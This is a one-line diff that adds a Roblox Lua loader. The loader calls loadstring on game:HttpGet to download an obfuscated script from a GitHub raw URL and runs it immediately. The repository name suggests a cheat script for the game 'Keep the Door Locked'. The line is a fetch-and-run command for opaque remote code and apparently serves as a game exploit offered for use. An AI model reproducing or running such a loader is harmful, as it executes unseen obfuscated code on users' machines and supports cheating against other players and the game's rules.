@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Kaitofyp/Keep-the-Door-Locked-Anomaly-Script-Beta-/refs/heads/main/obf_1e8Ejc5vF4BCWoAiqzhuIvKr4y32P18s9W6Y84AJw22tvSR0uTOt7FZI9h1mJcK9.lua.txt"))()
